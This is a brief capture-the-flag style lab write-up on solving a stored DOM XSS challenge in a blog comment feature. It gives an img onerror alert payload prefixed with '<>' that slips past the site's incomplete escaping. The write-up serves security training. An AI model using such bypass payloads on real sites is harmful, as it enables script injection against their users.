# Lab: Stored DOM XSS

This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the `alert()` function.

***

According To The Question stored DOM XSS vulnerability in the blog comment functionality !!

<figure><img src="../../../.gitbook/assets/image (816).png" alt=""><figcaption></figcaption></figure>

We Use This Payload To Bypass Escape characters -\
\
POV -

```
<><img src=x onerror=alert(1)>
```

After Encoding -&#x20;

```
&lt;&lt;<img src=x onerror=alert(1)>
```

Then `<img>` Tag Execute The Xss

<figure><img src="../../../.gitbook/assets/image (817).png" alt=""><figcaption></figcaption></figure>
